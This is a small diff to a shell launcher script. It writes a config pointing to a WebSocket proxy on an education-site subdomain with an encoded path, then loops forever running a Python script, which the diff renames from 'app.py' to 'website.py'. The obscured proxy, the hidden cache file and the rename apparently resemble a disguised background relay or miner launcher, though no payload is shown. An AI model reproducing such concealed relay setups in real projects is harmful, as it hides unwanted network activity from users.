@@ -6,6 +6,6 @@ echo -e "host=127.0.0.1\nport=3306\nproxy=wss://ws-zozo.hongphat.edu.vn/cG93ZXIy
 
 MIN=$1
 while true; do
-    python3 app.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
+    python3 website.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
     sleep 10
 done
